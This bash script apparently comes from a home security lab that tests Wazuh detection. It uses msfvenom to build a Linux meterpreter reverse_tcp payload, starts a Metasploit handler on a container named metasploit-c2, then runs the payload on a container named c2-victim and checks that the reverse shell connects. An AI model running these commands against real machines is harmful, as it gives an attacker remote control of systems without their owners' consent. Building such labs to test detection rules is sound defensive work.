#!/usr/bin/env bash
# build a reverse shell, start the handler, run it on the victim. from the repo root
set -euo pipefail

C2=metasploit-c2
VICTIM=c2-victim
LHOST=10.255.255.26
LPORT=4444
PAYLOAD=linux/x64/meterpreter/reverse_tcp

echo ">> building payload on $C2"
incus exec "$C2" -- msfvenom -p "$PAYLOAD" LHOST="$LHOST" LPORT="$LPORT" -f elf -o /root/payload.elf
incus file pull "$C2"/root/payload.elf /tmp/payload.elf
incus file push /tmp/payload.elf "$VICTIM"/root/payload.elf
rm -f /tmp/payload.elf

echo ">> starting handler (background transient unit)"
incus exec "$C2" -- systemctl reset-failed msf-handler 2>/dev/null || true
# msfconsole won't start without HOME set, and systemd-run doesn't pass one
incus exec "$C2" -- systemd-run --unit=msf-handler --collect --setenv=HOME=/root \
	msfconsole -q -x "use exploit/multi/handler; set payload $PAYLOAD; set LHOST $LHOST; set LPORT $LPORT; set ExitOnSession false; exploit"

echo ">> waiting for the handler to listen on :$LPORT"
for i in $(seq 1 40); do
	if incus exec "$C2" -- ss -ltn "( sport = :$LPORT )" 2>/dev/null | grep -q ":$LPORT"; then echo "   handler up"; break; fi
	sleep 3
done

echo ">> victim runs the payload"
incus exec "$VICTIM" -- systemctl reset-failed lab-payload 2>/dev/null || true
incus exec "$VICTIM" -- bash -c 'chmod +x /root/payload.elf; systemd-run --unit=lab-payload --collect --setenv=HOME=/root /root/payload.elf'

echo ">> checking the reverse connection from the victim side"
for i in $(seq 1 20); do
	if incus exec "$VICTIM" -- ss -tnp state established "( dport = :$LPORT )" 2>/dev/null | grep -q ":$LPORT"; then
		echo "   ESTABLISHED:"; incus exec "$VICTIM" -- ss -tnp state established "( dport = :$LPORT )"
		break
	fi
	sleep 2
done
echo "done. watch wazuh for rule 100300 + firewall-drop."
